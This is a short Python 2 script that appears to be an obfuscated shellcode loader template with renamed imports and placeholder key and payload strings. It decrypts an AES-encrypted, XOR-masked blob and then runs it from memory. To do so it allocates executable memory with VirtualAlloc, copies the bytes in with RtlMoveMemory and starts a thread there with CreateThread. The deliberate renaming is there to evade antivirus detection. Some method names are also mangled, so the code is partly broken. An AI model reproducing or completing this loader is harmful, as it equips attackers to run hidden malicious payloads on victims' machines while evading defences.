from ctypes import c_int as VAR1
import ctypes as VAR25
from ctypes import pointer as VAR5
from ctypes import c_char as VAR6
import hashlib as VAR2
from Crypto.Cipher import AES as VAR3
from base64 import b64decode as VAR7
from binascii import unhexlify as VAR8
from itertools import cycle as VAR9
from itertools import izip as VAR10
b1 = lambda s, p: s[0:-ord(s[-1])]
b2 = '---CIPHER---'
def fonk1(ciphertext, b3):
    return ''.join(chr(ord(x) ^ ord(y)) for (x, y) in VAR10(list(VAR7(ciphertext)), VAR9(b3)))
class class1:
    def fonk2(self, b3):
        self.b3 = VAR2.sha256(b3.encode('utf8')).digest()
        self.b4 = VAR3.block_size
    def fonk3(self, ciphertext):
        b5 = VAR7(ciphertext)
        b6 = VAR3.new(self.b3, VAR3.MODE_CBC, b5[:VAR3.block_size])
        return b1(b6.fonk3(b5[VAR3.block_size:]), VAR3.block_size)
b7 = '---b7---'
b8 = '---b8---'
b9 = class1(b2)
b10 = fonk1(b9.fonk3(b7), b8)
b11 = bytearray(VAR8(b10[::-1]))
b12 = VAR25.windll.kernel32.VirtualAlloc(VAR1(0), VAR1(len(b11)), VAR1(0x3000), VAR1(0x40))
b13 = (VAR6 * len(b11)).from_buffer(b11)
VAR25.windll.kernel32.RtlMoveMemory(VAR1(b12), b13, VAR1(len(b11)))
b14 = VAR25.windll.kernel32.CreateThread(VAR1(0), VAR1(0), VAR1(b12), VAR1(0), VAR1(0), VAR5(VAR1(0)))
VAR25.windll.kernel32.WaitForSingleObject(VAR1(b14), VAR1(-1))